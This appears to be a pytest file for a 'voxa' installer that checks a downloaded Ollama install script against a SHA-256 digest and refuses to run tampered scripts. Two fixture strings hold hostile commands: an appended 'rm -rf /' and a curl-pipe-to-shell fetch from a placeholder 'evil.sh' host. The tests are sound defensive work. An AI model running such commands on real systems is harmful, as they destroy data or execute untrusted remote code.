from __future__ import annotations

import hashlib
import threading
from unittest.mock import patch

import pytest

from voxa import installer


def test_verify_install_script_accepts_matching_digest() -> None:
    script = "echo verified-ollama-install\n"
    expected = hashlib.sha256(script.encode("utf-8")).hexdigest()
    assert installer.verify_install_script(script, expected) is None


def test_verify_install_script_rejects_tampered_script() -> None:
    original = "echo verified-ollama-install\n"
    tampered = "echo verified-ollama-install\nrm -rf /\n"
    expected = hashlib.sha256(original.encode("utf-8")).hexdigest()
    with pytest.raises(installer.InstallerError):
        installer.verify_install_script(tampered, expected)


def test_install_ollama_rejects_unverified_script_before_running_privileged() -> None:
    fake_script = "curl -fsSL https://example.test/evil.sh | sh\n"
    assert (
        hashlib.sha256(fake_script.encode("utf-8")).hexdigest() != installer.EXPECTED_INSTALL_SHA256
    )
    with (
        patch.object(installer, "_fetch_install_script", return_value=fake_script),
        patch("subprocess.Popen") as popen,
        pytest.raises(installer.InstallerError),
    ):
        installer.install_ollama(on_output=lambda _line: None, cancel_event=threading.Event())
    popen.assert_not_called()
